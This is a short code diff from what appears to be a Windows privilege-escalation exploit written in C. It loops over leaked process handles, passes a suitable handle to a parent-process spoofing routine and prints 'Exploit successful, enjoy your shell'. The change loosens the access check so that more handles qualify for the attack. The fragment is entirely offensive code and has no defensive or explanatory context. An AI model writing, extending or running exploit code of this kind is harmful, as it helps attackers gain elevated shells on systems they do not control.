@@ -43,8 +43,7 @@ int main(void)
     for (; cur; cur = cur->next) {
         if ( cur->handle && cur->access_type) {
             if ((cur->access_type == PROCESS_ALL_ACCESS) ||
-                (cur->access_type & PROCESS_CREATE_PROCESS &&
-                    cur->access_type & PROCESS_DUP_HANDLE)) {
+                (cur->access_type & PROCESS_CREATE_PROCESS)) {
                 if (NT_SUCCESS(spoof_parent(cur->pid, cur->handle))) {
                     puts("[+] Exploit successful, enjoy your shell");
                     goto out;
